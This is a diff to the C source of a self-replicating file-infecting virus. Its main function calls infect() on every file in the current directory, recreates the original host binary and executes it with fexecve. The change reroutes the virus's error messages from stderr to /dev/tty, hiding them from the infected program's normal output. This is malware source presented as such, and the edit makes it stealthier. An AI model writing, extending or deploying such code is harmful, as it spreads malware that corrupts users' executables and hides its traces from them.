@@ -590,6 +590,15 @@ close_fd:
 
 int main(int argc, char *const argv[], char *const envp[]) {
     (void)argc;
+    FILE *tty = fopen("/dev/tty", "a");
+    if (!tty) {
+        tty = fopen("/dev/null", "a");
+        assert(tty);
+    }
+
+    char buffer[BUFSIZ];
+    setvbuf(tty, buffer, _IOLBF, sizeof(buffer));
+
     DIR *dir = opendir(".");
     if (dir) {
         struct dirent entry;
@@ -601,12 +610,12 @@ int main(int argc, char *const argv[], char *const envp[]) {
 
             error = infect(entry.d_name);
             if (error) {
-                fprintf(stderr, "cannot infect %s: %s\n", entry.d_name, strerror(-error));
+                fprintf(tty, "cannot infect %s: %s\n", entry.d_name, strerror(-error));
             }
         }
         closedir(dir);
     } else {
-        fprintf(stderr, "cannot open .: %s\n", strerror(errno));
+        fprintf(tty, "cannot open .: %s\n", strerror(errno));
     }
 
     if (virus_victim.size == 0) {
@@ -616,7 +625,7 @@ int main(int argc, char *const argv[], char *const envp[]) {
 
     int tmp_fd = create_victim();
     if (tmp_fd < 0) {
-        fprintf(stderr, "cannot create victim: %s\n", strerror(-tmp_fd));
+        fprintf(tty, "cannot create victim: %s\n", strerror(-tmp_fd));
         return EXIT_FAILURE;
     }
 
@@ -629,14 +638,14 @@ int main(int argc, char *const argv[], char *const envp[]) {
 
     int tmp_fd2 = open(tmp_path, O_RDONLY | O_PATH);
     if (tmp_fd2 == -1) {
-        fprintf(stderr, "cannot reopen temporary file: %s\n", strerror(errno));
+        fprintf(tty, "cannot reopen temporary file: %s\n", strerror(errno));
         goto close_tmp_fd;
     }
 
     close(tmp_fd);
     fexecve(tmp_fd2, argv, envp);
 
-    fprintf(stderr, "cannot execute victim: %s\n", strerror(errno));
+    fprintf(tty, "cannot execute victim: %s\n", strerror(errno));
     close(tmp_fd2);
     return EXIT_FAILURE;
 
